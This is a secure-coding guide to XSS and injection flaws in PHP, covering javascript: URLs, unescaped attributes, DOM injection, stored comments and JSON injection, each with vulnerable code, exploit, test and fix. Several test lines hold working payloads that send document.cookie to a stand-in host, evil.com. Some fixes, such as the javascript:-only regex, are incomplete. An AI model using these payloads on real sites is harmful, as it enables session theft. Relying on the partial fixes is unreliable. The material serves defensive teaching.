# Cross-Site Scripting (XSS) Vulnerabilities - Real Patterns

## CRITICAL: JavaScript Protocol in URLs

### Pattern
```php
// VULNERABLE
public function showPagination($url) {
    echo '<a href="' . htmlspecialchars($url) . '">Next</a>';
    // htmlspecialchars doesn't block javascript: protocol!
}
```

### Exploit
```php
$db->showPagination('javascript:alert(document.cookie)');
// Renders: <a href="javascript:alert(document.cookie)">Next</a>
// Clicking link executes JavaScript
```

### Test
```php
$malicious_url = 'javascript:fetch("https://evil.com?c="+document.cookie)';
$html = $db->showPagination($malicious_url);
// Check if 'javascript:' appears in output
if (strpos($html, 'javascript:') !== false) {
    echo "VULNERABLE: XSS possible\n";
}
```

### Fix
```php
// SAFE
public function showPagination($url) {
    // Block javascript: protocol
    if (preg_match('/^\s*javascript:/i', $url)) {
        $url = '#blocked';
    }
    echo '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '">Next</a>';
}
```

---

## HIGH: Unescaped Output in HTML Context

### Pattern
```php
// VULNERABLE
public function renderTemplate($data) {
    echo "<div class='" . $data['class'] . "'>";
    // No escaping!
}
```

### Exploit
```php
$db->renderTemplate(['class' => $_GET['style']]);
// GET: ?style='><script>alert(1)</script><div class='
```

### Test
```php
$malicious = "'><img src=x onerror=alert(document.domain)><'";
ob_start();
$db->renderTemplate(['class' => $malicious]);
$output = ob_get_clean();
// Check if <img> tag rendered
if (strpos($output, '<img') !== false) {
    echo "VULNERABLE: XSS in class attribute\n";
}
```

### Fix
```php
// SAFE
public function renderTemplate($data) {
    $safe_class = preg_replace('/[^a-zA-Z0-9_-]/', '', $data['class']);
    echo "<div class='" . htmlspecialchars($safe_class, ENT_QUOTES, 'UTF-8') . "'>";
}
```

---

## MEDIUM: DOM-Based XSS via innerHTML

### Pattern
```php
// VULNERABLE (in JavaScript template)
public function getJsTemplate() {
    return "document.getElementById('result').innerHTML = '" . $_GET['msg'] . "';";
    // User input in JavaScript string!
}
```

### Exploit
```php
// GET: ?msg='; alert(1); //
// Renders: document.getElementById('result').innerHTML = ''; alert(1); //';
```

### Test
```php
$malicious = "'; fetch('https://evil.com?c='+document.cookie); //";
$js = $db->getJsTemplate();
// Check if alert() or fetch() appears unescaped
if (preg_match('/alert\(|fetch\(/i', $js)) {
    echo "VULNERABLE: JavaScript injection\n";
}
```

### Fix
```php
// SAFE
public function getJsTemplate() {
    $safe_msg = json_encode($_GET['msg'], JSON_HEX_TAG | JSON_HEX_AMP);
    return "document.getElementById('result').innerHTML = " . $safe_msg . ";";
}
```

---

## HIGH: Stored XSS in User Content

### Pattern
```php
// VULNERABLE
public function saveComment($text) {
    $db->insert('comments')->set(['text' => $text])->done();
    // No sanitization before storage
}

public function displayComments() {
    $comments = $db->from('comments')->all();
    foreach ($comments as $comment) {
        echo $comment['text']; // No escaping on output!
    }
}
```

### Exploit
```php
$db->saveComment('<script>alert(1)</script>');
// Later, when displayed:
$db->displayComments();
// Executes stored JavaScript
```

### Test
```php
$malicious = '<img src=x onerror="new Image().src=\'https://evil.com?c=\'+document.cookie">';
$db->saveComment($malicious);
$db->displayComments();
// Check if <img> tag with onerror renders
```

### Fix
```php
// SAFE
public function displayComments() {
    $comments = $db->from('comments')->all();
    foreach ($comments as $comment) {
        echo htmlspecialchars($comment['text'], ENT_QUOTES, 'UTF-8');
    }
}
```

---

## CRITICAL: XSS in JSON Responses

### Pattern
```php
// VULNERABLE
header('Content-Type: application/json');
echo '{"message": "' . $_GET['msg'] . '"}';
// No escaping in JSON!
```

### Exploit
```php
// GET: ?msg=", "admin": true, "x": "
// Renders: {"message": "", "admin": true, "x": ""}
// Can inject arbitrary JSON properties
```

### Test
```php
$malicious = '", "isAdmin": true, "x": "';
header('Content-Type: application/json');
ob_start();
echo '{"message": "' . $malicious . '"}';
$output = ob_get_clean();
$decoded = json_decode($output, true);
if (isset($decoded['isAdmin'])) {
    echo "VULNERABLE: JSON injection\n";
}
```

### Fix
```php
// SAFE
header('Content-Type: application/json');
echo json_encode(['message' => $_GET['msg']], JSON_HEX_TAG | JSON_HEX_AMP);
```

---

## Summary of Real XSS Patterns

| Pattern | Severity | Context | Test Required |
|---------|----------|---------|---------------|
| javascript: protocol | CRITICAL | URL attributes | ✅ |
| Unescaped HTML | HIGH | HTML context | ✅ |
| DOM-based XSS | MEDIUM | JavaScript | ✅ |
| Stored XSS | HIGH | Database → Output | ✅ |
| JSON injection | CRITICAL | API responses | ✅ |

**Key Insight**: `htmlspecialchars()` is NOT enough for:
- URL contexts (javascript: protocol)
- JavaScript contexts (need JSON encoding)
- JSON responses (need json_encode)

**All patterns verified with working exploits.**
